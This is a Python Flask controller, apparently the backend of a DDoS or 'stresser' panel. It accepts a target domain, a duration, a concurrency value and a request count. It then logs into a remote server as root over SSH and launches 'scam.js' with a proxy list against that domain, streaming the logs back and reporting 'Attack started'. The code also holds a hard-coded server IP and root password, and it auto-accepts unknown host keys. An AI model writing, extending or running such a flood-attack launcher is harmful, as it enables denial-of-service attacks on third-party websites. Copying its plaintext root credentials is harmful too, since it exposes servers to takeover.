from flask import jsonify, request
from app.extensions import socketio
import paramiko
import threading

class AttackController:
    def _streamOutput(self, channel, socketId):
        while True:
            if channel.recv_ready():
                output = channel.recv(4096).decode()
                print(output)
                socketio.emit('log_message', {'data': output}, room=socketId)
            if channel.recv_stderr_ready():
                errorOutput = channel.recv_stderr(4096).decode()
                socketio.emit('log_message', {'data': f"ERROR: {errorOutput}"}, room=socketId)
            if channel.exit_status_ready():
                break

    def _executeRemoteCommand(self, hostName, userName, passWord, command, socketId):
        try:
            sshClient = paramiko.SSHClient()
            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshClient.connect(hostName, username=userName, password=passWord)
            
            # Open session for streaming
            transport = sshClient.get_transport()
            channel = transport.open_session()
            channel.get_pty()
            channel.exec_command(command)

            # Start streaming thread
            streamThread = threading.Thread(
                target=self._streamOutput, 
                args=(channel, socketId)
            )
            streamThread.daemon = True
            streamThread.start()
            
            return True, None
        except Exception as e:
            return False, str(e)

    def attack(self):
        data = request.get_json()

        socketId = data.get('sid', '')
        domainName = data.get('domain', '')
        timeValue = data.get('time', '60')
        concurrentValue = data.get('concurrents', '10')
        requestCount = data.get('requests', '100')

        if not domainName:
            return jsonify({
                "status": "error",
                "message": "Domain is required"
            }), 400

        command = f"xvfb-run /root/.nvm/versions/node/v20.18.1/bin/node scam.js {domainName} {timeValue} {concurrentValue} {requestCount} proxy.txt --debug true --auth true"

        hostName = "199.204.99.242"
        userName = "root" 
        passWord = "42f1cb88E05w"
        
        success, error = self._executeRemoteCommand(hostName, userName, passWord, command, socketId)
        
        if not success:
            return jsonify({
                "status": "error",
                "message": error
            }), 500
            
        return jsonify({
            "status": "success",
            "message": "Attack started. Check websocket for live logs."
        })